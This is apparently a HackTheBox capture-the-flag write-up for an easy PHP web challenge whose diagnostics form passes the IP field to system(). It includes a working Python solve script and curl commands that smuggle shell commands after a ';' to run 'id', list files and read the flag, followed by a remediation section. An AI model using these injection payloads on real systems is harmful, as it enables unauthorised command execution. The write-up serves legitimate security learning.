---
title: "looking glass"
date: 2027-03-08 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, php, command-injection, rce]
description: "An Easy Web challenge: a network 'Looking Glass' tool runs ping and traceroute on whatever IP you type. The backend drops that value straight into a shell command with no escaping, so a single ';' turns the diagnostics form into arbitrary command execution."
---

## Overview

**looking glass** is an Easy HackTheBox **Web** challenge. It presents a network
"Looking Glass" — a form that runs `ping` or `traceroute` against a host you supply.
The page title is, helpfully, `rce`. The backend builds the shell command by string
concatenation, so the IP field is a textbook
[OS command injection](https://cwe.mitre.org/data/definitions/78.html)
([CWE-78](https://cwe.mitre.org/data/definitions/78.html)) sink — one `;` and you
are running commands as the web user, straight to the flag.

## The technique

The application's `index.php` runs the chosen diagnostic like this:

```php
function runTest($test, $ip_address) {
    if ($test === 'ping')       { system("ping -c4 ${ip_address}"); }
    if ($test === 'traceroute') { system("traceroute ${ip_address}"); }
}
runTest($_POST['test'], $_POST['ip_address']);
```

`$ip_address` comes directly from `$_POST` and is interpolated into the string passed to
`system()` — with **no validation and no `escapeshellarg()`**. `system()` runs that string
through `/bin/sh`, which interprets shell metacharacters (`;`, `|`, `&&`, `$()`, backticks).
So a value like `127.0.0.1; id` ends the `ping` invocation and runs a second command of
our choosing. The command's output is helpfully reflected back inside the result
`<textarea>`, giving a direct, non-blind channel.

## Solution

A short script confirms the injection, finds the randomly-named flag file at `/`, and reads it:

`solve.py`:

```python
#!/usr/bin/env python3
import sys, re, requests

def run(base, cmd):
    r = requests.post(base + "/", data={"test": "ping",
            "ip_address": f"127.0.0.1; {cmd}", "submit": "Test"}, timeout=25)
    m = re.search(r"<textarea[^>]*>(.*?)</textarea>", r.text, re.S)
    return m.group(1) if m else r.text

if __name__ == "__main__":
    base = sys.argv[1].rstrip("/")
    fname = run(base, "ls / | grep flag").strip().splitlines()[-1].strip()
    out = run(base, f"cat /{fname}")
    flag = re.search(r"HTB\{[^}]+\}", out)
    print(flag.group(0) if flag else out)
```

Step by step:

1. **Confirm RCE.** A `ping` with `ip_address=127.0.0.1; id` returns the normal ping
   output followed by `uid=1000(www) gid=1000(www) groups=1000(www)` — command execution
   confirmed as the `www` user.

   ```bash
   curl -s -X POST "http://<target>/" \
     --data-urlencode 'test=ping' \
     --data-urlencode 'ip_address=127.0.0.1; id' \
     --data-urlencode 'submit=Test'
   ```

2. **Locate the flag.** It lives at `/` but is randomly named, so don't guess — list it:

   ```bash
   curl -s -X POST "http://<target>/" \
     --data-urlencode 'test=ping' \
     --data-urlencode 'ip_address=127.0.0.1; ls / | grep flag' \
     --data-urlencode 'submit=Test'
   # -> flag_LSLyY
   ```

3. **Read it.**

   ```bash
   python3 solve.py http://<target>
   # -> HTB{...}
   ```

The flag is redacted here — re-run `solve.py` against a live instance to derive it.

## Why it worked

Passing user input into `system()` (or `exec`, `popen`, backticks — in any language) spawns
a shell, and a shell parses metacharacters. Because the IP value was concatenated into the
command string rather than passed as a separate, escaped argument, the attacker controls
shell *syntax*, not just data — so `;` introduces an entirely new command.

## Fix / defense

Never build a shell command string from user input:

```php
// 1. Validate the input as what it must be
if (!filter_var($ip_address, FILTER_VALIDATE_IP)) {
    die("invalid IP");
}
// 2. Better still: avoid the shell entirely — pass an argument vector
$p = proc_open(['ping', '-c4', $ip_address],
               [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
```

- **Validate** strictly (`FILTER_VALIDATE_IP`) so only an IP can reach the command.
- **Avoid the shell** by passing an argument array (`proc_open([...])`,
  Python `subprocess.run(['ping','-c4',ip])`) — with no shell, there are no
  metacharacters to abuse.
- If a shell is unavoidable, wrap every interpolated value in `escapeshellarg()`.
